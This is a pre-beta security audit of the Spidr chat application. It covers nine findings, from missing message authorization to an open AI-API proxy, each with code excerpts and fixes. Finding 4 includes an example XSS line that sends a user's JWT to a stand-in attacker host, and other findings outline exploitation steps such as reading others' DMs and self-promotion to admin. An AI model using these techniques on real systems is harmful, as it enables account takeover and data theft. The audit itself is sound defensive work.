# Spidr Beta Security Audit

**Date:** May 2025
**Scope:** spidr-server, spidr-client, spidr-auth — full stack review
**Context:** Pre-beta with 50 users on Railway + MongoDB Atlas

---

## Severity Legend

| Level | Meaning |
|---|---|
| **CRITICAL** | Exploitable now. Data leak, account takeover, or financial damage. Fix before any beta users touch the app. |
| **MODERATE** | Exploitable under specific conditions. Fix before public launch. |
| **LOW** | Defense-in-depth gap. Address when convenient. |

---

## CRITICAL — Fix Before Beta

### 1. Direct Messages & Other Entities Have No Authorization

**File:** `spidr-server/src/routes/directMessages.js` (line 3)
**Also affects:** Any entity route using `crudRouter()` without `ownerField`

**The problem:**
```js
// This is the entire file:
module.exports = crudRouter(DirectMessage);
```
The generic `crudRouter` only checks ownership on PATCH and DELETE — and only when `ownerField` is set. With no `ownerField`, any authenticated user can:
- `GET /direct-messages?conversation_id=<any_id>` → read anyone's private DMs
- `PATCH /direct-messages/<id>` → edit anyone's messages
- `DELETE /direct-messages/<id>` → delete anyone's messages

**Impact:** Complete breach of private messaging. Any logged-in user can read every DM in the database by iterating conversation IDs.

**Likely affected routes (need audit):**
- `direct-messages` — no ownerField
- `group-chat-messages` — needs verification
- `ai-chat-logs` — needs verification
- `ai-conversations` — needs verification
- `voice-sessions` — needs verification
- `comments` — needs verification
- `feed-comments` — needs verification

**Fix:** Add `ownerField` to every entity route, or add custom authorization middleware that checks the requesting user is a participant in the conversation/server/group.

---

### 2. `/ai/invoke` Is an Open LLM Proxy

**File:** `spidr-server/src/routes/ai.js` (line 12)

**The problem:** Any authenticated user can POST arbitrary prompts to your OpenAI or Anthropic API key. There is:
- No per-user rate limiting (the global 200/15min limit is shared across all routes)
- No prompt length cap
- No usage tracking

**Impact:** A single user could send thousands of LLM requests and burn through API credits. At $0.15/1K input tokens (GPT-4o-mini), a determined user looping requests could cost $50–100/hour.

**Fix:**
- Add a strict per-user rate limit (e.g., 10 requests/minute)
- Cap `prompt` length (e.g., 2000 characters)
- Track per-user usage and set daily limits
- Consider a biomass cost per AI call to throttle economically

---

### 3. CORS Allows Null/File Origins in Production

**File:** `spidr-server/src/index.js` (lines 33, 50)

**The problem:**
```js
if (!origin) return cb(null, true);                    // line 33
if (origin.startsWith('file://') || origin.startsWith('app://')) return cb(null, true);  // line 50
```
Requests with no `Origin` header (curl, Postman, server-to-server) or `file://` origins bypass CORS entirely. This is intentional for Electron but also works for any attacker tool.

**Impact:** CORS is not a security boundary by itself (the JWT requirement is the real gate), but this removes a defense layer. If a token is ever leaked, there's nothing preventing cross-origin exploitation.

**Fix:** In production, restrict to the exact `CLIENT_ORIGIN` value. For Electron, use a custom protocol (`spidr://`) and whitelist that specifically. Remove the blanket `!origin` passthrough in production.

---

### 4. JWT Stored in localStorage — Vulnerable to XSS

**Files:** `spidr-client/src/api/apiClient.js`, `spidr-client/src/lib/AuthContext.jsx`

**The problem:** The JWT is stored in `localStorage.getItem('spidr_token')` and attached to every request as a Bearer token. If any XSS vulnerability exists anywhere in the app, an attacker's script can:
```js
fetch('https://evil.com/steal?token=' + localStorage.getItem('spidr_token'));
```

**Compounding factor:** Content Security Policy is disabled on the server:
```js
contentSecurityPolicy: false,  // index.js line 22
```
This means there's no browser-level protection against injected scripts.

**Impact:** Full account takeover via token theft if XSS is found.

**Fix (short-term):** Enable a strict CSP on both server and client. This is the highest-ROI change — it blocks XSS exploitation even if a vulnerability exists.

**Fix (long-term):** Move JWT to HttpOnly cookies. This requires changes to both spidr-auth (set cookie on login) and spidr-server (read cookie instead of Authorization header), plus CSRF protection.

---

## MODERATE — Fix Before Public Launch

### 5. TOTP Endpoints Lack Strict Rate Limiting

**File:** `spidr-server/src/routes/auth.js`

**The problem:** The auth route file defines a strict `authLimiter` (10 req/15 min) for sensitive endpoints, but the TOTP routes (`/auth/setup-totp`, `/auth/verify-totp-setup`, `/auth/disable-totp`) are on the Node.js server under `apiClient.js`'s `api.post()` — they go through the global rate limiter (200/15 min), not the strict auth limiter.

**Impact:** An attacker with a stolen JWT could brute-force 6-digit TOTP codes. At 200 attempts/15 min, a 6-digit code (1M possibilities) would take ~52 days — low risk, but the fix is trivial.

**Fix:** Apply the strict `authLimiter` to TOTP verification endpoints.

---

### 6. No Input Validation on Message Content

**Files:** `spidr-server/src/utils/crudRouter.js` (line 82), all message routes

**The problem:** Message content is stored exactly as submitted — no length limit, no sanitization. The `crudRouter` CREATE handler does:
```js
const doc = await Model.create(data);  // raw req.body
```

React's JSX auto-escapes output, which protects against basic reflected XSS. But:
- If any component renders user content via `dangerouslySetInnerHTML` or a markdown renderer without sanitization, stored XSS becomes possible
- A user can submit a 10MB message body (the Express JSON limit is 10mb)
- No profanity or content moderation layer exists

**Fix:**
- Add a message length cap (e.g., 4000 characters, matching Discord's limit)
- Audit all components for unsafe HTML rendering
- Consider a content moderation pipeline (even basic keyword filtering) before public launch

---

### 7. Upload Route Trusts Client-Declared MIME Type

**File:** `spidr-server/src/routes/upload.js` (line 17)

**The problem:**
```js
fileFilter: (_req, file, cb) => {
    if (ALLOWED_MIME_TYPES.has(file.mimetype)) cb(null, true);
```
The `file.mimetype` comes from the client's `Content-Type` header — it's trivially spoofable. An attacker can upload an HTML file claiming it's `image/png`. When served from R2 or `/uploads`, the browser may execute it.

**Impact:** Stored XSS via uploaded HTML/SVG files.

**Fix:** Validate file magic bytes (use a library like `file-type`) instead of trusting the declared MIME type. Also set `Content-Disposition: attachment` on served uploads to prevent browser execution.

---

### 8. `crudRouter` CREATE Accepts Arbitrary Fields

**File:** `spidr-server/src/utils/crudRouter.js` (lines 78–86)

**The problem:** The PATCH handler strips `PROTECTED_FIELDS` (`password`, `role`, `is_banned`, etc.), but the POST/CREATE handler does not:
```js
router.post('/', guard, async (req, res) => {
    const data = req.body;                    // no filtering
    if (ownerField) data[ownerField] = req.user?.id;
    const doc = await Model.create(data);     // stored as-is
});
```

**Impact:** On models that have a `role` or `is_admin` field, a user could self-elevate by including `"role": "admin"` in a POST body. Mongoose schema validation may partially mitigate this (if `role` has an `enum`), but it's not guaranteed across all 23 models.

**Fix:** Apply the same `PROTECTED_FIELDS` filter to the POST handler.

---

### 9. Socket Token Never Refreshes

**File:** `spidr-client/src/api/apiClient.js` (lines 260–274)

**The problem:**
```js
export function getSocket() {
    if (!_socket) {
        const token = localStorage.getItem('spidr_token');
        _socket = io(..., { auth: { token } });
    }
    return _socket;
}
```
The token is captured once when the socket first connects. If the JWT expires (or the user's account is banned/disabled), the socket remains connected and functional.

**Impact:** A banned or expired user retains real-time access until they refresh the page.

**Fix:** Add a server-side socket middleware that periodically re-validates the token (e.g., on every 10th event, or via a heartbeat). On failure, force-disconnect the socket.

---

## Summary & Priority Matrix

| # | Issue | Severity | Effort | Priority |
|---|---|---|---|---|
| 1 | DM/entity authorization bypass | CRITICAL | Medium (2–3 days) | **P0 — before beta** |
| 2 | Open LLM proxy | CRITICAL | Low (1 hour) | **P0 — before beta** |
| 3 | CORS allows null origin in prod | CRITICAL | Low (1 hour) | **P0 — before beta** |
| 4 | JWT in localStorage + no CSP | CRITICAL | Medium (CSP: 1 day, cookies: 1 week) | **P0 — enable CSP before beta, cookies before launch** |
| 5 | TOTP rate limiting gap | MODERATE | Low (30 min) | P1 — before launch |
| 6 | No message input validation | MODERATE | Low (1–2 hours) | P1 — before launch |
| 7 | Upload MIME type spoofing | MODERATE | Low (1–2 hours) | P1 — before launch |
| 8 | CREATE accepts arbitrary fields | MODERATE | Low (30 min) | P1 — before launch |
| 9 | Socket token never refreshes | MODERATE | Medium (half day) | P2 — before launch |

## Recommended Action Plan

**Week 1 (before beta):**
1. Add authorization guards to all entity routes (especially DMs, group messages, AI logs)
2. Rate-limit and cap the `/ai/invoke` endpoint
3. Enable Content Security Policy on spidr-server
4. Tighten CORS for production deployments

**Week 2–3 (before public launch):**
5. Apply `PROTECTED_FIELDS` filter to crudRouter POST handler
6. Add file magic byte validation to uploads
7. Add message length caps
8. Add socket token re-validation
9. Apply strict rate limiter to TOTP endpoints

**Long-term:**
10. Migrate JWT from localStorage to HttpOnly cookies
11. Add content moderation pipeline
12. Security headers audit (HSTS, X-Frame-Options, etc.)
